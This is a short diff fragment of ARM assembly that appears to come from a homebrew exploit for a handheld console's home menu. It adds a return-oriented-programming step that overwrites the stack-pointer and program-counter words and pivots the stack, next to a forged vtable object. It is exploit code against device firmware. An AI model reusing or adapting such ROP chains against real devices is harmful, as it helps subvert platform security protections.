@@ -92,6 +92,17 @@ ROPMACRO_WRITEWORD FILEPATHPTR_THEME_SHUFFLE_BODYCACHE, (THEMEDATA_NEWFILEPATHS_
 
 ROPMACRO_STACKPIVOT TARGETOVERWRITE_STACKADR, POP_R4FPPC @ Begin the stack-pivot ROP to restart execution from the previously corrupted stackframe.
 
+menuhaxloader_beforethreadexit:
+@ Copy the addr from menuhax_payload beforethreadexit_return_spaddr to the word which will be popped into sp.
+ROPMACRO_COPYWORD ROPBUFLOC(stackpivot_sploadword), MENUHAXLOADER_LOAD_BINADDR+12
+
+@ Write to the word which will be popped into pc.
+ROPMACRO_WRITEWORD ROPBUFLOC(stackpivot_pcloadword), ROP_POPPC
+
+ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP
+
+ROPMACRO_STACKPIVOT_JUMP
+
 object:
 .word ROPBUFLOC(vtable) @ object+0, vtable ptr
 .word ROPBUFLOC(object) @ Ptr loaded by L_2441a0, passed to L_1e95e0 inr0.
